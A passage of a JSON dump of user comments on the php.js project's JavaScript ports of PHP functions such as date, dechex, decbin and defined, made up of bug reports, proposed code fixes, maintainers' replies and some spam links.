\"\/1\/1\")) \/ 864e5\n[\/CODE]\n\nthus it returned 2 days more for '2009-10-25' than for '2009-10-24'.\n\nMy fixed function is :\n[CODE]\n            z: function (){\n\t\t\t\tvar m = f.n();\n\t\t\t\tvar z = 0;\n\t\t\t\tfor (i=1; i<m; i++) z+= f.t(i);\n\t\t\t\treturn z + f.j();\n            }\n[\/CODE]\n\nWhich uses an improved t function accepting a parameter :\n[CODE]\n            t: function (n) {\n                if (n == undefined) n = jsdate.getMonth() + 1;\n                if ( n == 2 ) return 28 + f.L();\n                if ( n & 1 && n < 8 || !(n & 1) && n > 7 ) return 31;\n                return 30;\n            }\n[\/CODE]\n\n\nThanks for the good work !"},{"date":"2009-11-30 09:13:53","author":"Theriault","url":"","comment":"@Felix: The 'W' function has been updated with a new algorithm. Thank you for your contribution.\r\n\r\n@Thomas: I cannot seem to reproduce the bug you are experiencing. What is your system's current timezone offset and what browser are you using? Also, does the following code also fix the problem:\r\n[CODE]\r\nz: function () {\r\n    return Math.round((new Date(f.Y(), f.n() - 1, f.j()) - new Date(f.Y(), 0, 1)) \/ 864e5);\r\n},\r\n[\/CODE]"},{"date":"2009-12-01 09:00:14","author":"JT","url":"","comment":"Great work on an incredibly useful function, guys.\n\nSeems like repeatedly declaring the regEx and all of those inner functions every time the date function is called would be pretty inefficient, though. Have you considered doing something like this?\n\n[CODE]\nvar date = (function () {\n\n    function pad(n, c) {\n        ...\n    }\n\n    var that      = this,\n        formatChr = \/\\\\?([a-z])\/gi,\n        txt_words = [ ... ],\n        txt_ordin = { ... },\n        f = {\n            w : function (d) {\n                return d.getDay();\n            },\n            ...\n        };\n\n    return function (format, timestamp) {\n        \/\/ Just for clarity :$\n        if (timestamp) {\n            jsdate = (timestamp instanceof Date) ? new Date(timestamp) : new Date(timestamp * 1000);\n        } else {\n            jsdate = new Date();\n        }\n\n        return format.replace(formatChr, function (t, s) {\n            return f[t] ? f[t](jsdate) : s;\n        });\n    };\n}());\n[\/CODE]\n\nJT"},{"date":"2009-12-01 09:05:15","author":"JT","url":"","comment":"Might help if I had declared jsdate as a var in my post below, I suppose  =)\n\nJT"},{"date":"2009-12-19 01:22:33","author":"Thomas Beaucourt","url":"http:\/\/www.webapp.fr\/","comment":"@Theriault :\nCurrent timezone is Paris GMT+1 (winter \/ DST off)\nYour variant works, provided you throw in a +1 :\n[CODE]\nz: function (){\n    return Math.round((new Date(f.Y(), f.n() - 1, f.j()) - new Date(f.Y(), 0, 1)) \/ 864e5) + 1;\n}\n[\/CODE]"},{"date":"2010-04-23 08:16:47","author":"Rafal Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"My proposition for checking for leap years would be\n\n[CODE]\nL: function(){\n   return new Date(jsdate.getFullYear(), 1, 29).getMonth()==1|0;\n}\n[\/CODE]\n\nIt uses the JS engine to calculate the correct month for February 29 for given year."},{"date":"2010-04-23 08:42:54","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"IMO in U() we should do Math.floor instead of Math.round, cause we shouldn't add 1 sec to the result when the millisecond part is just over 500. If you agree, my proposition is\n\n[CODE]U: function () { \/\/ Seconds since UNIX epoch\n   return Math.floor(jsdate.getTime() \/ 1000);\n}[\/CODE]\nor even\n[CODE]U: function () { \/\/ Seconds since UNIX epoch\n   return jsdate.getTime() \/ 1000 | 0;\n}\nU: function () { \/\/ Seconds since UNIX epoch\n   return jsdate \/ 1e3 | 0;\n}[\/CODE]\nif you accept less self-explaining code."},{"date":"2010-04-23 11:19:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafa\u0142 Kukawski: I think I agree. As long as it's 10:00:00 (.9), it still is 10:00:00 and not 10:00:01 implemented your fix, thanks a lot! http:\/\/github.com\/kvz\/phpjs\/commit\/c3cd2f82d214c4b11edac89d14162fcad3a5675e"},{"date":"2010-08-02 18:52:47","author":"clinisbut","url":"","comment":"Hi, I'm having an issue with date function. \nStarting from a timestamp, I'm adding seven days and converting to string using date() function. Rarely, when I add seven days to 2010-10-31 it gives me 2010-11-6 instead of 2010-11-7.\nThis is my code\n[CODE]\n$P = new PHP_JS();\ntimestamp = $P.mktime( 0, 0, 0,month, day, year );\n\ntemp = timestamp + (60*60*24*7);\n\nstring_date = $P.date('d-m-Y', temp));\n[\/CODE]\n\nOther dates work fine... is this a bug?"},{"date":"2010-09-08 17:18:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@clinisbut: Tested it, but our output exactly matches PHP's.\n\nHere, this snippet runs both in PHP as in the unnamespaced php.js version:\n\n$timestamp = mktime(0, 0, 0, 10, 31, 2010);\n$temp = $timestamp + (60*60*24*7);\n$string_date = date('d-m-Y', $temp);\nprint($string_date);"},{"date":"2010-09-19 00:26:24","author":"clinisbut","url":"","comment":"@Kevin: Thanks, I found the problem: It relates with daylight saving time. So that was my fault. sorry."},{"date":"2010-11-30 14:29:22","author":"Nox","url":"","comment":"Hi, just send you an email with a few changes I recommend.\n\nThe first one was already made by @JT:\n[code]\nvar date = (function() { ... return function(date, timestamp)\n[\/code]\n\nThe second one is just a way to honor JS...\n[code]\nDate.prototype.format = function (format) {return date(format, this); };\n[\/code]\n\nAnd last but not least I changed to access to the day-strings and month-strings to make it more customizable.\n[code]\n        \/*...*\/\n        F: function () { \/\/ Full month name; January...December\n            return date.i18n.months[12 + f.n()];\n        }\n        \/*...*\/\n\ndate.lang = { eng: {\n\t\tdays: [ \/* days start with 0 *\/ ],\n\t\tmonths: [null, \/* months start with 1 *\/],\n\t\tordin: { \/* ... *\/ }\n\t}\n};\ndate.i18n = date.lang.eng; \/\/ select english\n[\/code]\n\nHope this is useful. If anyone needs my code send me an email.\n\nThanks for the code, I'm using it serverside on node.js like I was using PHP-date before,\nNox"},{"date":"2010-11-30 14:33:53","author":"Nox","url":"","comment":"... Actually I just can't figure out where I should send the modified version... If you like to get it, just send me an email...\nThanks again\nNox"},{"date":"2010-12-02 08:14:24","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Nox: Thanks for the submissions. As far as JT's change, I don't have time right now to review; anyone else? As far as Date.prototype, we don't like to pollute the native prototype objects, though I know it can be convenient. As far as internationalization, as per PHP's recommendation (since date() is not localized), we use strftime & setlocale for localization of dates instead (as it provides a clear \"PHP way\" for us to implement it following the same API and behavior)."},{"date":"2011-01-10 09:44:22","author":"saturn ","url":"","comment":"In line 147 the code not right.\ndate('o-W',1293840000);\n the result return 2012-52 , php function will return 2010-52.\nmaybe the code can change to \nreturn Y + (n === 12 && W < 9 ? -1 : n === 1 && W > 9? -1 : 0);\nthanks"},{"date":"2011-01-10 09:54:46","author":"saturn ","url":"","comment":"if the W value less than 9 the value eq X(9>=x>0) can not display 0X(PHP can do);"},{"date":"2011-02-27 14:15:34","author":"Matthew Ralston","url":"www.mralston.com","comment":"Looks like there's a bug in date() when using Firefox. It's certainly present on version 4.0b7 on Mac OS X, not sure about other versions.\n\n[code]\n<script type=\"text\/javascript\" src=\"php.full.min.js\"><\/script>\n<script type=\"text\/javascript\">\n\nwindow.onload=function() {\n\tvar myDate='1970-01-01 00:00:00';\n\tvar myTimestamp=strtotime(myDate);\n\tvar myFormattedDate=date('d\/m\/Y H:i:s', myTimestamp);\n\t\n\talert('myDate: ' + myDate + '\\n' + 'myTimestamp: ' + myTimestamp + '\\n' + 'myFormattedDate: ' + myFormattedDate);\n}\n\n<\/script>\n[\/code]\n\nAfter applying date(), it incorrectly reports that the hour is 01, instead of 00.\n\nDoesn't seem to be an issue in Safari."},{"date":"2011-03-21 14:41:41","author":"Martin","url":"","comment":"Be aware that this implementation will emit non-zero-padded numbers when using \"W\" whereas php's native implementation does pad the lower numbers.\n"},{"date":"2011-04-05 17:30:50","author":"Matteo","url":"","comment":"I think I found a problem with this function:\n\n[CODE]\ndate('d-m-Y', strtotime(\"2012-02-04 +6 WEEK\"));\n[\/CODE]\n\nreturns 17-05-2011 insted of 17-03-2012 as it should. Or am I doing something wrong?"},{"date":"2011-04-07 16:57:02","author":"Alex Wilson","url":"","comment":"A shorter implementation:\n\nhttps:\/\/gist.github.com\/raw\/899179\/40ef949f244fdbf4103804b870c515e134b611ec\/php.date.js"},{"date":"2011-04-08 17:37:29","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Alex Wilson: Thanks very much for the implementation, but by relying on \"new Function\", it runs a bit more slowly, as well as has some eval-ish concerns. "},{"date":"2011-04-11 04:48:37","author":"Theriault","url":"","comment":"@Martin: Thanks. Fixed."},{"date":"2011-05-29 01:08:37","author":"","url":"","comment":""},{"date":"2011-06-22 11:10:21","author":"Frederik Hannibal","url":"","comment":"FYI: Test #5 fails in node.js "},{"date":"2011-07-07 05:47:52","author":"","url":"","comment":""},{"date":"2011-07-17 19:08:48","author":"","url":"","comment":""},{"date":"2011-07-18 19:14:39","author":"","url":"","comment":""},{"date":"2011-07-20 19:31:50","author":"","url":"","comment":""},{"date":"2011-09-18 10:04:18","author":"omid","url":"","comment":"O return incorrect format\nfor example return +0350 instead of  +0330\ncode must change to\n[CODE]\nvar a = jsdate.getTimezoneOffset();\nreturn (a > 0 ? \"-\" : \"+\") + _pad(Math.floor(Math.abs(a) \/ 60) * 100 + Math.abs(a) % 60, 4);\n[\/CODE]"},{"date":"2011-09-18 16:58:17","author":"Rafa? Kukawski","url":"","comment":"@omid: thanks for your bug report. The function is now fixed on Github (https:\/\/github.com\/kvz\/phpjs\/commit\/97aa7a53befc80544cd4bdc681deab041cfee779)"},{"date":"2011-09-23 15:21:24","author":"Gotibandhu","url":"","comment":"Hello Everyone,\nWe can use Date () object to manipulate dates in java script. Whenever we want to access current date of the system or want to set new date in java script then we can use appropriate java script method of date function. In this demonstration we learn how to work with function of date object.........\nFor more details check this link.....\nhttp:\/\/mindstick.com\/Articles\/c18de1aa-fd9c-433a-80ea-93c14522c856\/?Implementing%20Date%20object%20in%20Java%20Script\n\nThanks !!!!"},{"date":"2011-09-26 16:37:57","author":"ZERONETA","url":"","comment":"[CODE]\nvar date = function( a, s )\n{\n\tvar d = isNaN( s *= 1000 ) ? new date() : new date( s ), f = d.getTime();\n\treturn ( '' + a ).replace( \/a|A|d|D|F|g|G|h|H|i|I|j|l|L|m|M|n|s|S|t|T|U|w|y|Y|z|Z\/g, function( a )\n\t{\n\t\tswitch ( a )\n\t\t{\n\t\t\tcase 'a' : return d.getHours() > 11 ? 'pm' : 'am';\n\t\t\tcase 'A' : return d.getHours() > 11 ? 'PM' : 'AM';\n\t\t\tcase 'd' : return ( '0' + d.getDate() ).slice(-2);\n\t\t\tcase 'D' : return [ 'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat' ][ d.getDay() ];\n\t\t\tcase 'F' : return [ 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December' ][ d.getMonth() ];\n\t\t\tcase 'g' : return ( s = ( d.getHours() || 12 ) ) > 12 ? s - 12 : s;\n\t\t\tcase 'G' : return d.getHours();\n\t\t\tcase 'h' : return ( '0' + ( ( s = d.getHours() || 12 ) > 12 ? s - 12 : s ) ).slice(-2);\n\t\t\tcase 'H' : return ( '0' + d.getHours() ).slice(-2);\n\t\t\tcase 'i' : return ( '0' + d.getMinutes() ).slice(-2);\n\t\t\tcase 'I' : return (function(){ d.setDate(1); d.setMonth(0); s = [ d.getTimezoneOffset() ]; d.setMonth(6); s[1] = d.getTimezoneOffset(); d.setTime( f ); return s[0] == s[1] ? 0 : 1; })();\n\t\t\tcase 'j' : return d.getDate();\n\t\t\tcase 'l' : return [ 'Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday' ][ d.getDay() ];\n\t\t\tcase 'L' : return ( s = d.getFullYear() ) % 4 == 0 && ( s % 100 != 0 || s % 400 == 0 ) ? 1 : 0;\n\t\t\tcase 'm' : return ( '0' + ( d.getMonth() + 1 ) ).slice(-2);\n\t\t\tcase 'M' : return [ 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec' ][ d.getMonth() ];\n\t\t\tcase 'n' : return d.getMonth() + 1;\n\t\t\tcase 's' : return ( '0' + d.getSeconds() ).slice(-2);\n\t\t\tcase 'S' : return [ 'th', 'st', 'nd', 'rd' ][ ( s = d.getDate() ) < 4 ? s : 0 ];\n\t\t\tcase 't' : return (function(){ d.setDate(32); s = 32 - d.getDate(); d.setTime( f ); return s; })();\n\t\t\tcase 'T' : return 'UTC';\n\t\t\tcase 'U' : return ( '' + f ).slice( 0, -3 );\n\t\t\tcase 'w' : return d.getDay();\n\t\t\tcase 'y' : return ( '' + d.getFullYear() ).slice(-2);\n\t\t\tcase 'Y' : return d.getFullYear();\n\t\t\tcase 'z' : return (function(){ d.setMonth(0); return d.setTime( f - d.setDate(1) ) \/ 86400000; })();\n\t\t\tdefault : return -d.getTimezoneOffset() * 60;\n\t\t};\n\t} );\n};\n[\/CODE]"},{"date":"2011-12-29 09:46:01","author":"Chris","url":"www.devotis.nl","comment":"The o for ISO-8601 year is wrong!\n\ndate,        W,     o,     o should be\n2007-12-31, 52,  2006,  2008\n2010-01-01, 52,  2011,  2009\n2011-01-01, 52,  2012,  2010\n2012-01-01, 52,  2013,  2011\n2001-12-31,  1,  2000,  2002\n\nChange function for 'o' to:\n[CODE]\no: function () { \/\/ ISO-8601 year\n  var n = f.n(), W = f.W(), Y = f.Y();\n  return Y + (n === 12 && W < 9 ? +1 : n === 1 && W > 9 ? -1 : 0);\n}\n[\/CODE]"},{"date":"2012-05-07 12:57:50","author":"Dick Olsson","url":"","comment":"There's a bug in regards to the \"c\" (ISO-8601) format. I'm not sure where to submit patches, but here's the simple fix:\n\n[CODE]\n@@ -882,7 +882,7 @@\n\n       \/\/ Full Date\/Time\n       c: function () { \/\/ ISO-8601 date.\n-          return 'Y-m-d\\\\Th:i:sP'.replace(formatChr, formatChrCb);\n+          return 'Y-m-d\\\\TH:i:sP'.replace(formatChr, formatChrCb);\n[\/CODE]"},{"date":"2012-06-15 22:25:23","author":"Andrew Ensley","url":"http:\/\/andrewensley.com\/","comment":"Is there a way to use this function without exposing it globally? I'm trying to add it as a private function inside a closure, and for some reason, it's still exposed in the global namespace (tested in Firefox 13). I'm not enough of a javascript guru to understand why this is happening."},{"date":"2012-06-16 04:10:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Andrew Ensley: While most functions in php.js are stand-alone (though some interact with or set a \"php_js\" global if you are not using the namespaced version of phpjs), this one was optimized to avoid re-building the \"f\" object, etc. each time the function was run. \n\n\"this.date = ...\" is where it sets \"date\" as a global property since \"this\" is treated like \"window\" in browsers when the function is not called with \"new\". The reason we use \"this.date\" instead of just setting \"date\" alone is because we want the function to be the same if you add date() as a method of an object (like our own namespaced version does). When date() is inside of an object, the function will not redefine \"date\" as a global but will redefine the method. \n\nYou can modify the function fairly easily by changing the two \"this.date\" references to \"_date\" or you could wrap date() into an object and call that object."},{"date":"2012-06-21 20:25:41","author":"Andrew Ensley","url":"http:\/\/andrewensley.com\/","comment":"@Brett: Thank you for that explanation! Just learned something new about javascript."},{"date":"2012-07-04 16:04:30","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Dick Olsson: I see your change has already been made in Git. Thanks!"},{"date":"2012-07-05 14:58:14","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Chris: I have applied your fix to Git. Thanks!"},{"date":"2012-08-27 21:39:04","author":"Bernard Lapera","url":"","comment":"I just used this function to test something in the client side.  It seems the date is off by a full day, the PHP generated date is what I was expecting.  Same with other tested dates.\nThanks for all you guys do!\n\nJS:\n[CODE]\ndate('Y-m-d', 1364774400) = 2013-03-31\n[\/CODE]\n\nPHP:\n[CODE]\ndate('Y-m-d', 1364774400) = 2013-04-01\n[\/CODE]"}],"decbin":[{"date":"2008-10-04 11:56:57","author":"Onno Marsman","url":"","comment":"decbin('8') does not work correctly. A fix:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction decbin(number) {\r\n    return parseInt(number).toString(2);\r\n}\r\n[\/CODE]"},{"date":"2008-11-06 21:21:58","author":"ben","url":"","comment":"wow!!! so cool!!!"},{"date":"2009-08-04 12:23:28","author":"nord_ua","url":"","comment":"[CODE]\ndecbin(-3)\n[\/CODE]\n-11 "},{"date":"2009-08-05 03:58:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@nord_ua: Thanks for the report! Fixed in SVN..."},{"date":"2009-08-06 13:17:58","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl","comment":"Please note that there is a difference between the handling of large numbers in different browsers. e.g. \n\nIE8\n[CODE]\n>>decbin(3747030078639374300)\n\"1.101000000000000100000000000010000000000000001(e+61)\"\n[\/CODE]\n\nFirefox 3.5\n[CODE]\n>>> decbin(3747030078639374300)\n\"11010000000000001000000000000100000000000000010000000000000000\"\n[\/CODE]\n\nThis is caused by the fact that Number.toString(2) doesn't work in IE for numbers written in scientific notation internally.\n"},{"date":"2009-08-16 15:19:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tim de Koning: Thanks for pointing that out."}],"dechex":[{"date":"2008-10-03 14:10:15","author":"Enrique Gonz\u00e1lez","url":"http:\/\/www.maciaspajas.com","comment":"The same code could be used for decoct and decbin functions:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction decoct(number){\r\n  return number.toString(8);\r\n  }\r\n  \r\nfunction decbin(number){\r\n  return number.toString(2);\r\n  }\r\n[\/CODE]"},{"date":"2008-10-03 15:20:20","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Enrique Gonz\u00c3\u00a1lez: Yes it could! Added!"},{"date":"2008-10-03 23:15:32","author":"Philippe Baumann","url":"","comment":"This also applies the other way round:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction octdec(oct_string)\r\n{\r\n\toct_string = (oct_string+'').replace(\/[^0-7]\/gi, '');\r\n\treturn parseInt(oct_string, 8);\r\n}\r\n\r\nfunction bindec(binary_string)\r\n{\r\n\tbinary_string = (binary_string+'').replace(\/[^01]\/gi, '');\r\n\treturn parseInt(binary_string, 2);\r\n}\r\n[\/CODE]\r\n\r\nNote that the PHP manual pages for octdec() and bindec() do not mention the filtering, however it does actually take place:\r\n\r\n[CODE=&quot;php&quot;]\r\n&lt;?php\r\necho octdec('a180'); \/\/ 'a180' -&gt; '10' -&gt; 8\r\necho &quot;&lt;br \/&gt;&quot;;\r\necho bindec('c120'); \/\/ 'c120' -&gt; '10' -&gt; 2\r\n?&gt;\r\n[\/CODE]"},{"date":"2008-10-04 11:59:16","author":"Onno Marsman","url":"","comment":"dechex('16') does not work correctly. A fix:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction dechex(number) {    \r\n    return parseInt(number).toString(16);\r\n}\r\n[\/CODE]"},{"date":"2008-10-04 16:39:32","author":"Philippe Baumann","url":"","comment":"Well, the specificain is\r\n[CODE=&quot;php&quot;]\r\nstring dechex ( int number)\r\n[\/CODE]\r\nso it really expects an integer and only returns a string."},{"date":"2008-10-04 16:48:04","author":"Philippe Baumann","url":"","comment":"Nevermind. It seems you were right and the PHP functions also accept string-type arguments. However the manual doesn't state it anywhere, so I assume it's not specially encouraged.\r\n\r\nAlso, I mistyped 'specification' in my previous comment (shame on me)."},{"date":"2008-10-04 17:06:23","author":"Philippe Baumann","url":"","comment":"And while we're already at it:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction base_convert(number, frombase, tobase)\r\n{\r\n\treturn parseInt(number, frombase).toString(tobase);\r\n}\r\n[\/CODE]"},{"date":"2008-10-05 10:05:56","author":"Onno Marsman","url":"","comment":"It is well known that PHP is a weakly typed language. Of course this is not mentioned at every functions page in the documentation.\r\nAnd because javascript is also weakly typed I think it would be obvious to make this library also weakly typed. And with that I mean: as close to the behavior of PHP as possible, which, of course, is the main goal of this library."},{"date":"2008-10-06 11:56:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philippe Baumann &amp; Onno Marsman: Excellent work gentlemen. As far as the loosely typed discussion, I would have to side with Onno there.\r\nPS, we almost have the entire unported list of the math section covered!"},{"date":"2009-06-10 20:59:18","author":"pilus","url":"","comment":"what about this one here : \n\ndechex(-1415723993) \n\nit returns \"-54623bd9\", but when tried in php and in MSWIN calc, returns AB9DC427 and FFFFFFFFAB9DC427 consecutively. anybody know what's wrong ? cause i don't ... >.<"},{"date":"2009-06-10 21:07:59","author":"pilus","url":"","comment":"hohoho .... using information from this link : http:\/\/stackoverflow.com\/questions\/57803\/how-to-convert-decimal-to-hex-in-javascript, i managed to modify the function to satisfy my needs, I'm currently porting a AES-PHP algorithm to JS, and I've been pondering my code, because there's some infinite loop there somewhere, it's because the dechex-js returned a negative hex for a negative input, whereas PHP version does not.\n\nSo, here you, hopefully it could be usefull for anyone else ... :P\n\n[CODE]\nfunction dechex(number) {\n\tif (number < 0)\t{\n\t   return (0xFFFFFFFF+number+1).toString(16);\n\t}\n    return parseInt(number).toString(16);\n}\n[\/CODE]"},{"date":"2009-06-10 23:09:43","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Great, thanks, Pilus! I've fixed it in SVN and credited you for it. The only difference was I kept the 2nd argument in parseInt even though its redundant, since jslint complains about it..."},{"date":"2009-06-11 13:19:08","author":"pilus","url":"","comment":"actually i would like people at stackoverflow to be credited, but when i want to make a comment there, they required me to register ... and I don't want to register .... \n\njust so people still credit the original link, here they are : \n\nhttp:\/\/stackoverflow.com\/questions\/57803\/how-to-convert-decimal-to-hex-in-javascript\n\n@Brett : thx for the credit ... :D, but the other numeric conversion function should do the same, I think, I've tried the decbin in php, it returns non negative number, but I have not tried the one in php.js ... :D"},{"date":"2009-06-18 06:44:19","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok, I made the credit fix, but I'll hold off on the other functions for now (unless you want to indicate which ones need it, etc.)"},{"date":"2009-08-05 04:01:21","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@pilus: I finally got around to updating the other related functions--to my knowledge it seems only the dec* functions needed changing, as these were the ones relying on toString() with a numeric argument (and which could have negative values (i.e., unlike bin2hex))..."},{"date":"2009-08-11 16:30:05","author":"Lokde","url":"","comment":"rediffmail javascript:;; error"},{"date":"2009-08-16 15:20:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Lokde: Come again?"}],"decoct":[{"date":"2008-10-04 11:54:01","author":"Onno Marsman","url":"","comment":"decoct('8') does not work correctly. A fix:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction decoct(number) {\r\n    return parseInt(number).toString(8);\r\n}\r\n[\/CODE]"},{"date":"2008-10-06 12:00:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsmann: Fixed, thank you!"}],"define":[{"date":"2011-09-23 11:28:17","author":"Gotibandhu","url":"","comment":"Hi, \n function start() {\n            document.write(\"This is start function which is called when the document is loaded in browser.<br \/>\");\n            document.write(\"This is non parametrize function.<br \/>\");\n            document.write(\"I am going to call a parametrize function which return addition of two number.<br \/>\");\n            var num1 = 45, num2 = 66;\n            var res = getAddition(num1, num2);\n            document.write(\"Addition of two number is  : \" + res + \" <br \/>\");\n        }\nFor more details please check out the following link .............\nThanks a lot!!!!!"},{"date":"2011-09-23 11:29:57","author":"Gotibandhu","url":"","comment":"Hi, \nplease check out this link.......\nhttp:\/\/mindstick.com\/Articles\/0864994b-563d-4180-87bd-b6e3bea77c26\/?Function%20in%20Java%20Script\n\nThanks !!!"}],"defined":[{"date":"2008-12-21 02:42:10","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's an implementation which works with the 'const' keyword. Tested with NaN, booleans, numbers, strings, arrays, objects, regular expression literals.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nconst a = 5;\r\nvar b = 5;\r\nalert(defined('a')); \/\/ true \r\nalert(defined('b'));  \/\/ false\r\n\r\nfunction defined (constant) {\r\n    var tmp = window[constant];    \r\n    window[constant] = window[constant] ? 'changed'+window[constant].toString() : 'not-null';\r\n    if (typeof window[constant] === 'number' &amp;&amp; isNaN(window[constant])) { \/\/ NaN\r\n        return typeof tmp === typeof window[constant];\r\n    }\r\n    return window[constant] === tmp;\r\n}\r\n[\/CODE]"},{"date":"2008-12-21 07:41:18","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Whoops... forgot to reassign the variable I temporarily changed:\r\n\r\n[CODE=&quot;Javascript&quot;]function defined (constant) {\r\n    var returnval;\r\n    var tmp = window[constant];    \r\n    window[constant] = window[constant] ? 'changed'+window[constant].toString() : 'not-null';\r\n    if (typeof window[constant] === 'number' &amp;&amp; isNaN(window[constant])) { \/\/ NaN\r\n        returnval = typeof tmp === typeof window[constant];\r\n        if (!returnval) {\r\n            window[constant] = tmp;\r\n        }\r\n        return returnval;\r\n    }\r\n    returnval = window[constant] === tmp;\r\n    if (!returnval) {\r\n        window[constant] = tmp;\r\n    }\r\n    return returnval;\r\n}\r\n[\/CODE]"},{"date":"2008-12-30 12:33:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: If I'm not mistaken you are reassigning the variable a value to make sure it really is a constant.\r\n\r\nIf it's not set, you set it to not-null? That part I don't get.\r\nThen, if it's a number AND it's not a number (?!) and the types of the original &amp; newly set var do not match you reset it to it's original value. But if they do match you leave the 'changed' keyword there? I don't understand that.\r\n\r\nOne concern that comes to surface is that you are changing a user variable (if they accidentally specify a variable instead of a const).\r\n\r\nIf the function fails or there is a parallel process, a the changed value will be returned.\r\n\r\nCould you explain a bit more about this approach? I'm just not getting it I guess."},{"date":"2009-01-23 17:04:03","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok, as far as &quot;not-null&quot;, that should be changed to &quot;changed&quot; (to be more clear). That is just providing some way to ensure that an undefined variable will return false (since &quot;changed&quot; will not equal 'undefined'). We need to do some test for whether it is defined, since it will otherwise throw an error. This is safe since the value will be reset back to its original value (in this case to undefined).\r\n\r\nAs far as the NaN issue in the function... NaN is actually is considered to be typeof number, but that was redundant, and I shouldn't have handled it as a constant anyways because I've since discovered NaN, Infinity, and undefined are all variables in JavaScript--you can change them!\r\n\r\nThe only way that adding the 'changed' keyword to the &quot;variable&quot; could result in the same value as the original temporary variable is if the original was a constant. For example, (non-constant) objects or arrays will have their toString() methods called, but they will get an additional string &quot;changed&quot; appended, so they can never match (and thus the variable will get set back to its original value).\r\n\r\nAs far as failing, I don't see any reason which could cause it to fail--do you? (if it crashed at that point, the changed variable would be meaningless anyways). \r\n\r\nAs far as a parallel process, even if the person is using a setTimeout &quot;thread&quot;, my understanding is that the function must fully complete before yielding since JavaScript doesn't have true threads. So the variable should always get set back, as far as I can tell.\r\n\r\n(Off the subject, but speaking of setTimeout, I just realized we could allow passing of PHP-style callbacks-as-strings into JavaScript functions by calling setTimeout with a 0 ms timeout (optionally building arguments to pass in as necessary).)\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar a = function(b){alert('aaa');}\r\nrunCallback('a')\r\nfunction runCallback (cb) {\r\n    var a = setTimeout(cb+&quot;()&quot;,0) \r\n}\r\n[\/CODE]\r\n\r\nOk, now here's the simplified defined() function:\r\n\r\n[CODE=&quot;Javascript&quot;]function defined (constant) {\r\n    var tmp = window[constant];\r\n    window[constant] = window[constant] ? 'changed'+window[constant].toString() : 'changed';\r\n    var returnval = window[constant] === tmp;\r\n    if (!returnval) { \/\/ Reset\r\n        window[constant] = tmp;\r\n    }\r\n    return returnval;\r\n}[\/CODE]"},{"date":"2009-01-25 14:58:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: You convinced me! Interesting idea about the callbacks as well!"},{"date":"2009-01-26 12:45:29","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"As far as the callbacks-as-strings, on second thought, just using window[funcName]() (or building a function with an inner function if hard-wiring arguments is needed) avoids the eval()ish nature of setTimeout-with-1st-arg-as-string. But it was a fun thought... :)"},{"date":"2012-02-05 20:33:35","author":"danny morabito","url":"http:\/\/www.newsocialife.com","comment":"sorry, but isn't simplier:\n[code]\nreturn this.window[const_name] === undefined ? false: true;\n[\/code]\n?"},{"date":"2012-02-06 04:25:16","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@danny morabito: This is not just checking whether a variable exists. In such a case \"return this.window[const_name] !== undefined\" would work. This is looking for a genuine constant which cannot be altered."},{"date":"2012-04-11 15:43:41","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet\n"},{"date":"2012-09-01 17:09:46","author":"Xexys","url":"","comment":"Hello!\nI'm trying to use such construction\n\n[CODE]\nif (!defined('MY_CONST'))\n        define('MY_CONST', \"some text\");\n[\/CODE]\n\nAnd I get an error 'TypeError: redeclaration of var MY_CONST'\n\nbut this works correct\n\n[CODE]\nif (!defined('MY_CONST')) {\n        delete MY_CONST;\n        define('MY_CONST', \"some text\");\n}\n[\/CODE]\n\nMay be you can fix?\n"}],"dirname":[{"date":"2008-04-28 11:27:30","author":"XoraX","url":"","comment":"[CODE=&quot;php&quot;]\r\ndirname('\/dir\/test\/'); \/\/ output \/dir\r\n[\/CODE]\r\nso :\r\n[CODE=&quot;javascript&quot;]\r\nreturn path.replace(\/\\\\\/g,'\/').replace(\/\\\/[^\\\/]*\\\/?$\/, 